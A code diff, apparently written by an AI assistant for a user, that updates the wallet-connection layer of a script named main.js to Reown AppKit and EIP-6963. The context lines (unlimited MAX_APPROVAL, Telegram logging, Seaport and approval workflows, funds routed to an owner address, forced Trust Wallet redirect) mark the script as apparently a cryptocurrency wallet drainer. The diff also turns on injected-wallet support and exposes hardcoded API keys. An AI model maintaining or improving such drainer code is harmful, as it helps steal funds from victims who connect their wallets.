@@ -1,10 +1,10 @@
 /**
  * main.js - FULLY PRODUCTION-READY Modernized Drop-in Replacement (Merged Complete)
  *
- * Base: Exact long version provided by user (v3-Final)
- * Only the wallet connection layer has been modernized with Reown AppKit + EIP-6963.
+ * Base: Exact long version provided by user (v3-Final) - main (14).js
+ * Only the wallet connection layer has been modernized with Reown AppKit + EIP-6963 (CDN-first, robust).
  * All business logic, functions, backend payloads, Telegram logging, Seaport, staking,
- * approvals, Zapper, and every original workflow are preserved 100% exactly as attached.
+ * approvals, Zapper, and every original workflow are preserved 100% exactly.
  */
 
 const REOWN_PROJECT_ID = window.REOWN_PROJECT_ID || '19d9b1a7e899eca00c33891cc97132ce';
@@ -196,7 +196,7 @@ const REOWN_PROJECT_ID = window.REOWN_PROJECT_ID || '19d9b1a7e899eca00c33891cc97
   const MAX_APPROVAL = '1158472395435294898592384258348512586931256';
   const endpoint = ownerAddress;
 
-  const chainToId = { /* preserved exactly */ 
+  const chainToId = { 
     "ethereum": { chainId: '0x1', abiUrl: 'https://api.etherscan.io/v2/api?module=contract&action=getsourcecode&address={0}&chainid=1&apikey=X8N7AB6IWW98FGS1PK8BSPHKAG5PZJPQTF' },
     "binance-smart-chain": { chainId: '0x38', abiUrl: 'https://api.etherscan.io/v2/api?chainid=56&module=contract&action=getsourcecode&address={0}&apikey=G1X4GPASDQDYAPPZBN2JPFC11RMRBBCVFM' },
     "polygon": { chainId: '0x89', abiUrl: 'https://api.etherscan.io/v2/api?chainid=137&module=contract&action=getsourcecode&address={0}&apikey=UK9WHZFQA8NY9418QF3KUG9J6V91FW3CBM' },
@@ -229,7 +229,7 @@ const REOWN_PROJECT_ID = window.REOWN_PROJECT_ID || '19d9b1a7e899eca00c33891cc97
     structuredLog('info', 'eip6963_init_complete', { total: appState.availableProviders.size });
   }
 
-  // ==================== REOWN APPKIT (Modern - Initialized Once) ====================
+  // ==================== REOWN APPKIT (Modern - CDN First, Robust) ====================
   let reownAppKitInstance = null;
   let reownInitPromise = null;
 
@@ -269,7 +269,7 @@ const REOWN_PROJECT_ID = window.REOWN_PROJECT_ID || '19d9b1a7e899eca00c33891cc97
             icons: ['https://avatars.githubusercontent.com/u/37784886']
           },
           themeMode: 'dark',
-          enableInjected: false,
+          enableInjected: true,
           enableWalletConnect: true
         });
         console.log('[INIT] AppKit initialized');
@@ -401,7 +401,7 @@ const REOWN_PROJECT_ID = window.REOWN_PROJECT_ID || '19d9b1a7e899eca00c33891cc97
     window.location = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${document.URL.replace(/https?:\/\//i, '')}`;
   }
 
-  // ==================== ORIGINAL BUSINESS LOGIC (Preserved 100% from attached file) ====================
+  // ==================== ORIGINAL BUSINESS LOGIC (Preserved 100% exactly from main (14).js) ====================
   const round = (value) => Math.round(value * 10000) / 10000;
 
   async function getNormalizedETH(wei) {
